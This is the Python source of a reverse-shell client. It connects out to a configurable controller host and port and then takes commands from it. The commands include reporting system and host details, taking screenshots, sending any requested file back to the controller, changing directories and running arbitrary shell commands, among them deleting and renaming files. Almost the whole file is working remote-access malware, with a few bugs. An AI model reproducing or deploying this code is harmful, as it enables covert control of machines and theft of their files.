from socket import *
import subprocess
from getpass import getuser
import platform
import os
import pyautogui
import time


class clientSideShell:
    def __init__(self):
        self.get_os = platform.uname()
        self.get_user = getuser()
        # Change the ip here
        self.HOST_IP = "127.0.0.1"
        # Change the port here
        self.PORT_SERVER = 5050
        self.ALL_CMD_COMMAND = [
            'dir',
            'ipconfig',
            'hostname',
            'title',
            'echo',
            'getmac',
            'systeminfo',
            'del',
            'erase',
            'mkdir',
            'move',
            'rename',
            'replace',
            'rd',
            'rmdir',
            'tree'
        ]

    def InitializeShell(self):
        data_client = socket(AF_INET, SOCK_STREAM)
        data_client.connect((self.HOST_IP, self.PORT_SERVER))
        new_data_entry = f"[\033[92m+\033[00m] {self.get_os.node} - \033[42m CONNECTED \033[00m"
        data_client.send(new_data_entry.encode())
        clientShell.RunningServerSide(data_client)

    def RunningServerSide(self, data_client):
        while True:
            recever_server = data_client.recv(1024).decode()
            if recever_server == "status":
                status_online = f"\n[\33[92m*\33[00m] {self.get_user} - \33[92mONLINE\33[00m\n"
                data_client.send(status_online.encode())
            elif recever_server == "get_info --all":
                get_info_active_session_all = f"""
System : {self.get_os.system}
Node Name : {self.get_os.node}
Release : {self.get_os.release}
Version : {self.get_os.version}
Machine : {self.get_os.machine}
Processor : {self.get_os.processor}
"""
                data_client.send(get_info_active_session_all.encode())

            elif recever_server == 'get_info -sys':
                get_info_system = f"\n[\033[92m+\033[00m] System : \033[42m {self.get_os.system} \033[00m\n"
                data_client.send(get_info_system.encode())
            elif recever_server == 'get_info -name':
                get_info_name = f"\n[\033[92m+\033[00m] Desktop Name : \033[42m {self.get_os.node} \033[00m\n"
                data_client.send(get_info_name.encode())
            elif recever_server == 'active -session':
                get_all_active_sessions = f"Active Sessions : \n[\033[92m+\033[00m] {self.get_os.node} - [\033[92m{self.HOST_IP}\033[00m] - [\033[92m{self.PORT_SERVER}\033[00m] - STATUS : \033[42m ONLINE \033[00m"
                data_client.send(get_all_active_sessions.encode())
            elif recever_server == "screenshot":
                pyautogui.screenshot(region=(0, 0, 300, 400))
                im1 = pyautogui.screenshot()
                im1.save(r"C:\BS\Reverse\screen.png")
                data_client.send(im1.encode())
            elif recever_server[:7] == "down -f":
                try:
                    file = recever_server[8:]
                    file = open(file, "rb")
                    data = file.read()
                    file.close()
                    while True:
                        if len(data) > 0:
                            temp_data = data[:1024]
                            if len(temp_data) < 1024:
                                temp_data += chr(0).encode() * \
                                    (1024 - len(temp_data))
                            data = data[1024:]
                            data_client.send(temp_data)
                        else:
                            data_client.send("Downloaded".encode())
                            time.sleep(1)
                            break
                    data_client.send(
                        "[\33[92m+\33[00m] \33[92mSuccessfully downloaded your file \33[00m ".encode())
                except:
                    print("ERROR")
                    time.sleep(1)
                    data_client.send(
                        "[*] Please select a file (ex: example.txt)".encode())

            elif recever_server[:2] == 'cd':
                try:
                    os.chdir(recever_server[3:])
                    data_client.send(os.getcwd().encode())
                except:
                    unavailableDir = f"[\33[91m-\33[00m] \33[91m Unable to go in this directory (non-existant)\33[00m"
                    data_client.send(unavailableDir.encode())
                    time.sleep(2)

            elif recever_server[:5] == 'mkdir':
                success_rmdir = subprocess.getoutput(recever_server)
                success_mkdir = f"\n[\33[92m*\33[00m] Directory successfully created\n"
                data_client.send(success_mkdir.encode())

            elif recever_server[:5] == 'rmdir':
                success_rmdir = subprocess.getoutput(recever_server)
                success_rmdir = f"\n[\33[92m*\33[00m] Directory successfully removed\n"
                data_client.send(success_rmdir.encode())

            elif recever_server[:6] == 'rename':
                success_rename = subprocess.getoutput(recever_server)
                success_rename = f"\n[\33[92m*\33[00m] Successfully renamed\n"
                data_client.send(success_rename.encode())

            elif recever_server[:5] == 'start':
                success_start = subprocess.getoutput(recever_server)
                success_start = f"\n[\33[92m*\33[00m] Successfully started another command prompt window\n"
                data_client.send(success_start.encode())

            elif recever_server[:4] == 'echo':
                success_echo = subprocess.getoutput(recever_server)
                success_echo = f"\n[\33[92m*\33[00m] Successfully sent \n"
                data_client.send(success_echo.encode())
            else:
                unknown_command = "[\33[91m*\33[00m] \33[91mUnable to get informations with this command\33[00m"
                out_put = subprocess.getoutput(recever_server)
                if out_put == "" or out_put == None:
                    out_put = "/"
                    data_client.send(unknown_command.encode())
                else:
                    if recever_server in self.ALL_CMD_COMMAND:
                        data_client.send(out_put.encode())
                    else:
                        data_client.send(unknown_command.encode())


clientShell = clientSideShell()
clientShell.InitializeShell()
